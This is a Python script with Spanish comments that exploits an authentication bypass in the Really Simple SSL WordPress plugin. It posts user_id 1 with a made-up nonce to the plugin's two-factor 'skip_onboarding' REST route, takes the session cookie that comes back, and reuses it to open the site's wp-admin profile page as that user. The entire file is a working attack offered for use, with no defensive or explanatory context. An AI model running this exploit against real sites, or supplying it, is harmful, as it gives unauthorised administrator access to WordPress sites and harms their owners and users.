import requests
import webbrowser
import os

def realizar_nueva_peticion(valor_cookie, host):

    punto_final = f"http://{host}/wp-admin/profile.php"


    datos = {
        "log": usuario,
        "pwd": contrasena,
        "wp-submit": "Log+In",
        "redirect_to": f"http://{host}/wp-admin/",
        "testcookie": "1"
    }

    encabezados = {
        "Host": host,
        "Content-Length": str(len("&".join([f"{clave}={valor}" for clave, valor in datos.items()]))),
        "Cache-Control": "max-age=0",
        "sec-ch-ua": '"Not?A_Brand";v="99", "Chromium";v="130"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": f"http://{host}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": f"http://{host}/wp-login.php/",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": valor_cookie,  # Aquí se incluye el Set-Cookie capturado
        "Connection": "keep-alive"
    }

    try:

        respuesta = requests.post(punto_final, data=datos, headers=encabezados)


        print(f"Código de estado: {respuesta.status_code}")
        print(f"Cabeceras de la respuesta:\n{respuesta.headers}")
        

        directorio_script = os.path.dirname(os.path.abspath(__file__)) 
        ruta_archivo = os.path.join(directorio_script, "respuesta.html")

        with open(ruta_archivo, "w", encoding="utf-8") as archivo:
            archivo.write(respuesta.text)
        
        # Abrir el archivo HTML  con la cookie seteada en el navegador predeterminado
        webbrowser.open(f"file://{ruta_archivo}")
        print(f"Se ha abierto la respuesta en el navegador. Archivo guardado en: {ruta_archivo}")

    except requests.RequestException as e:
        print(f"Error al realizar la segunda petición: {e}")


def obtener_set_cookie():

    url = input("Introduce la URL para la petición (ej: https://localhost:8080): ")
    

    if not url.startswith("http://") and not url.startswith("https://"):
        print("Por favor, incluye el protocolo en la URL (http:// o https://).")
        return


    host = url.replace("http://", "").replace("https://", "").split("/")[0]

 
    punto_final = f"{url}/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"

    # Por aquí vamos a obtener la cookie una vez enviado
    datos = {
        "user_id": 1,
        "login_nonce": "133333337",
        "redirect_to": "/wp-admin/"
    }


    encabezados = {
        "Content-Type": "application/json",
        "Connection": "keep-alive"
    }

    try:

        respuesta = requests.post(punto_final, json=datos, headers=encabezados)


        if respuesta.status_code == 200:

            set_cookie = respuesta.headers.get("Set-Cookie")
            
            if set_cookie:

                valor_cookie = set_cookie.split(";")[0]

                print(f"Set-Cookie capturado: {valor_cookie}")
                
 
                realizar_nueva_peticion(valor_cookie, host)
            else:
                print("No se encontraron cabeceras Set-Cookie en la respuesta.")
        else:
            print(f"Error en la solicitud inicial: {respuesta.status_code} - {respuesta.text}")

    except requests.RequestException as e:
        print(f"Error al realizar la petición inicial: {e}")


if __name__ == "__main__":
    usuario = input("Introduce el usuario: ")
    contrasena = input("Introduce la contraseña: ")
    obtener_set_cookie()
